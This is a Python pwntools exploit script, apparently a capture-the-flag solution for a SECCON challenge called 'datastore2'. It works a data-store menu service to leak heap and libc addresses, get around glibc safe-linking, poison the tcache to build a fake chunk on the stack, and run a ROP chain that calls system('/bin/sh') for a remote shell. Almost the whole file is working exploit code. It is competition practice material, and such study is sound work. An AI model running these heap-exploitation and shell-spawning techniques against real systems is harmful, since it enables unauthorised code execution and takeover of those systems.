from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
    "--host",
    default="127.0.0.1",
    help="target host"
)
parser.add_argument(
    "--port",
    default=3001,
    help="target port"
)
parser.add_argument(
    '--log',
    action='store_true'
)
parser.add_argument(
    '--is-gaibu',
    action='store_true'
)
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "datastore2.dom.seccon.games"
    port = 7325
else:
    host = args.host
    port = args.port


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


r = remote(host, port)


def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)


def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s


def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')


def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)


def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)


def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send


def rs(s, new_line=True, r=b'> '):
    recvuntil(r)
    # s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r


def sa(r, s, new_line=True):
    rs(s, new_line, r)


"""
MENU
1. Edit
2. List
0. Exit
>
"""


def s_edit():
    rs(str(1))


def s_list():
    rs(str(2))


def s_update():
    rs(str(1))


def s_delete():
    rs(str(2))


def idx(i):
    recvuntil(b"index: ")
    sendline(str(i))


def s_copy():
    rs(str(3))


def choose_indices(l):
    s_edit()
    for j, i in enumerate(l):
        if j != 0:
            s_update()
        idx(i)


def create_array(l, size):
    choose_indices(l)
    if len(l) > 0:
        s_update()
    rs("a")
    recvuntil(b"input size:")
    sendline(str(size))


def create_value(l, data):
    choose_indices(l)
    if len(l) > 0:
        s_update()
    rs("v")
    recvuntil(b"input value: ")
    sendline(data)


def update_string(data):
    recvuntil(b"new string")
    recvuntil(b": ")
    sendline(data)


def copy_value(l, dst):
    choose_indices(l)
    s_copy()
    idx(dst)


def delete_value(l):
    choose_indices(l)
    s_delete()


victstr_len = 10
s = b""
# top = create_array(8)
create_array([], 8)

# top[0] = create_array(8)
create_array([0], 8)

# top[0][0] = create_array(8)
create_array([0, 0], 8)

# top[0][0][0] = "hoge"
create_value([0, 0, 0], "v" * victstr_len)

for i in range(7):
    # top[0][0][i + 1] = top[0][0]
    copy_value([0, 0, 0], i + 1)

for i in range(7):
    # top[0][i] = top[1]
    copy_value([0, 0], i + 1)

# top[i] = top[0]
for i in range(4):
    copy_value([0], i + 1)

# remove manually recursivelly so that we don't

create_array([7], 8)
create_array([6], 8)
for i in range(8):
    create_value([7, i], chr(0x61+i) * victstr_len)
#
for i in range(4):
    delete_value([7, i])
delete_value([4])


def leak():
    s_list()
    recvuntil(b"[00] <S> ")
    l = recvline()
    l = just_u64(l)
    recvuntil(b"MENU")
    return l


l = leak()
heap_base = decrypt(l) - 0x1d10 - 0x90 - 0x2c0
print("heap_base: ", hex(heap_base))

# remove unsortedbin
# create_array([6, 0], 8)
# create_array([6, 1], 8)

create_array([6, 2], 1)  # former str_t
print("leak:", hex(heap_base + 0x1d10))
create_value([6, 2, 0], str(heap_base + 0x1d10))  # str_t->buf

libc_base = leak() - 0x219ce0
print("libc_base: ", hex(libc_base))


if is_gaibu:
    environ = libc_base + 0x221200
    orig_onexit_addr = libc_base + 0x21af18
    orig_handler = libc_base + 0x2e4040
    init_first = libc_base + 0x21aea0
    system = libc_base + 0x50d70
    binsh = libc_base + 0x1d8698
    pop_rdi = libc_base + 0x2a3e5
    ret_addr = pop_rdi + 1
else:
    environ = libc_base + 0x221200
    orig_onexit_addr = libc_base + 0x21af18
    orig_handler = libc_base + 0x2e4040
    init_first = libc_base + 0x21aea0
    system = libc_base + 0x50d70
    # binsh = libc_base + 0x1d8678
    binsh = libc_base + 0x1d8698
    pop_rdi = libc_base + 0x2a3e5
    ret_addr = pop_rdi + 1


delete_value([6, 2, 0])
create_value([6, 2, 0], str(orig_onexit_addr))
orig_onexit_addr_encrypted = leak()
print("orig_onexit_addr_encrypted: ", hex(orig_onexit_addr_encrypted))

delete_value([6, 2, 0])
create_value([6, 2, 0], str(environ))
stack_base = leak()
print("environ: ", hex(stack_base))

# https://ctftime.org/writeup/34804

## leak end ##


# stack pivot buf
payload = [
    pop_rdi,
    binsh,
    ret_addr,
    system
]
# payload = p64(0) * 2 + p64(0) + p64(1) + p64(4) + p64(0) \
#     + p64(binsh) + p64(0)
payload = p64(0) + b"".join(map(p64, payload))
print(payload)
payload += b"\x00" * (64 - len(payload))
assert (b'\n' not in payload)
assert (b' ' not in payload)
print(len(payload))
print(hex(binsh))
create_value([5], payload)
stack_pivot = heap_base + 0x2348 - 8


# set the str buffer to the fake chunk
fake_chunk = heap_base + 0x2610
# target = init_first
target_saved_rbp = stack_base - 0x148
target = target_saved_rbp - 0x10
print("target: ", hex(target))

# set the str buffer to the fake chunk
delete_value([6, 2, 0])
create_value([6, 2, 0], str(fake_chunk))


# clear tcache
create_array([6, 3], 8)
create_array([6, 3, 0], 8)
create_array([6, 3, 1], 8)
for i in range(8):
    create_array([6, 3, 0, i], 1)
create_array([6, 3, 1, 0], 1)
for i in range(7):
    copy_value([6, 3, 1, 0], i+1)

# create chunks a b c
create_array([7, 3], 6)  # a
create_array([7, 4], 1)  # b
create_array([7, 5], 1)  # c
a = heap_base + 0x25c0

# create the buffer to be copied later
create_array([7, 6], 6)
encrypted = encrypt(target, heap_base + 0x23b0)
print("encrypted:", hex(encrypted))
create_value([7, 6, 2], str(encrypted))

create_array([7, 7], 1)
# val = 0xdeadbeef
val = stack_pivot
create_value([7, 7, 0], str(val))

# clear tcache again
create_array([6, 3, 2], 8)
create_array([6, 3, 3], 8)
for i in range(8):
    create_array([6, 3, 2, i], 1)
create_array([6, 3, 3, 0], 1)
for i in range(7):
    copy_value([6, 3, 3, 0], i+1)

delete_value([7, 5])
delete_value([7, 4])
delete_value([7, 3])


# 1. create fake chunk
create_value([7, 3],  b"A" * 56 + p64(0x71))

print("fake_chunk:", hex(fake_chunk))

# 2. free the fake chunk
delete_value([1, 0, 0])


# (3. create_array([6, 4], 6) == fake chunk)
# 4' copy the content of fake chunk to fake chunk
copy_value([7, 6], 4)

# 5. create_array([6, 5], 6)  (dummy)
copy_value([7, 7], 5)
copy_value([7, 7], 1)

# 6. create_array([6, 6], 6) == stack addr
wait_for_attach()
copy_value([7, 7], 2)


interactive()
